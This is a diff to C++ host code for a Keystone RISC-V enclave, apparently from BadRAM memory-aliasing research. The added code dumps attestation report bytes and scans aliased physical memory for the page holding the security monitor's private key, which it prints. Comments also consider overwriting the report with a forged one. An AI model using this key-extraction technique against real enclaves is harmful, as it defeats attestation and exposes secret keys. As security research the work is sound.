@@ -6,6 +6,8 @@
 #include "host.h"
 
 #include <getopt.h>
+#include <memory>
+#include <stddef.h>
 #include <stdlib.h>
 
 #include <cerrno>
@@ -18,7 +20,7 @@
 #include "edge/edge_common.h"
 #include "host/keystone.h"
 #include "verifier/report.h"
-
+#include "verifier/test_dev_key.h"
 // TODO: add paths to cmakelists
 extern "C" {
 #include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/include/readalias.h"
@@ -80,10 +82,36 @@ SharedBuffer::get_unsigned_long_or_set_bad_offset() {
                        : std::nullopt;
 }
 
+// NOTE: this function returns the report
+// structure after reading from memory
 std::optional<Report> SharedBuffer::get_report_or_set_bad_offset() {
   auto v = get_call_args_ptr_or_set_bad_offset();
   if (!v.has_value())
     return std::nullopt;
+
+  // before setting the report we can get the bytes from the shared buffer
+  //===========================
+  //
+  // get address to report bytes
+  byte *report_bytes = (byte *)v.value().first;
+  // create byte array size of report
+  byte report[sizeof(struct report_t)];
+  // copy report bytes
+  std::memcpy(&report, report_bytes, sizeof(struct report_t));
+
+  printf("Printing Report bytes\n");
+  __print_bytes((const byte *)report, sizeof(report_t));
+  struct report_t *report_s = (report_t *)report;
+  printf("Testing casting:\n");
+
+  __print_bytes(report_s->sm.public_key, PUBLIC_KEY_SIZE);
+  __dump_memory(report_s->sm.public_key, report_s->enclave.hash);
+  //===========================
+  //
+  // we might be able to memcopy to the report
+  // byte location our new report
+  // Normal operation below
+
   Report ret;
   ret.fromBytes((byte *)v.value().first);
   return ret;
@@ -172,12 +200,13 @@ void Host::print_buffer_wrapper(RunData &run_data) {
   }
 }
 
-bool __check_pattern(char buf[0x1000]) {
+bool __check_pattern(char buf[0x1000], const byte *pattern,
+                     size_t pattern_len) {
 
-  char pattern[] = {0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe};
+  // char pattern[8] = {0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe};
 
   // uint64_t deadbeef = 0xdeadbeefcafebabe;
-  size_t pattern_len = sizeof(pattern);
+  // size_t pattern_len = sizeof(pattern);
   for (int i = 0; i <= (0x1000 - pattern_len); i++) {
     if (memcmp(&buf[i], pattern, pattern_len) == 0)
       return true;
@@ -185,17 +214,44 @@ bool __check_pattern(char buf[0x1000]) {
   return false;
 }
 
-void __print_page(char buf[0x1000], uint64_t addr) {
+static void __print_page(char buf[0x1000], uint64_t addr) {
   printf("Page at [%llx]: \n", addr);
   for (int val = 0; val < 0x1000; val++)
-    printf("%x ", buf[val]);
+    printf("%02x ", buf[val]);
   printf("\n");
 }
-void __dump_memory() {
+/**
+ *Either the enclave hash or the SM hash (or both) does not match with expeced.
+ *		=== Security Monitor ===
+ *Hash:
+ *0babf00d0babf00d2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f5a5a5a5a3c3c3c3c2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
+ *Pubkey: deadbabedeadbabe2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
+ *Signature:
+ *deadfacedeadface2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f5a5a5a5a3c3c3c3c2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
+ *
+ *		=== Enclave Application ===
+ *Hash:
+ *296b1fd3dd2d7a0ed2047c6bd9af4121a9d0090ba6d20c36fe88f15d3153ae95edea680d5ac69dc8eb718a285a3463e824f0749e730995e0c8324c5a0afd57c1
+ *Signature:
+ *9906b65dcc07496c73d57c21d6ea0cc6c69553902b04f457cdf290b4b9f2bd54a85940c0c3b1293ad2af05d2b4d3eb14783a2a43efbd9ab4c87ccaf329fe0007
+ *Enclave Data: 3138303432383933383300
+ *		-- Device pubkey --
+ *deadcafedeadcafe2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
+ *Returned data in the report match with the nonce sent.
+ *
+ * */
+static void __print_bytes(const byte *buf, size_t buf_len) {
+  for (size_t i = 0; i < buf_len; i += 1) {
+    printf("%02x ", *(buf + i));
+  }
+  printf("\n");
+}
+
+static void __dump_memory(const byte *pub_key, const byte *enclave_hash) {
+
   // Just dump pages:
   char buf[4096] = {0};
   page_stats_t stats;
-
   for (uint64_t paddr_candidate = 0x200000000; paddr_candidate < 0x1000000000;
        paddr_candidate += 0x1000) {
 
@@ -203,10 +259,11 @@ void __dump_memory() {
     if (memcpy_frompa(buf, paddr_candidate, 4096, &stats, true) != 0) {
       printf("PAddr reading Error\n");
       return;
-      // continue;
     }
-    // compare page with public key
-    if (__check_pattern(buf))
+    // if pub key exists and no enclave data exists we have the page to the
+    // private key
+    if (__check_pattern(buf, pub_key, PUBLIC_KEY_SIZE) &&
+        !__check_pattern(buf, enclave_hash, MDSIZE))
       __print_page(buf, paddr_candidate);
 
     // maybe compare with the public key to see that we can reach the page
@@ -233,8 +290,6 @@ void Host::copy_report_wrapper(RunData &run_data) {
     run_data.report = std::make_unique<Report>(std::move(t.value()));
     shared_buffer.set_ok();
   }
-  // call to dump memory
-  __dump_memory();
   return;
 }
 
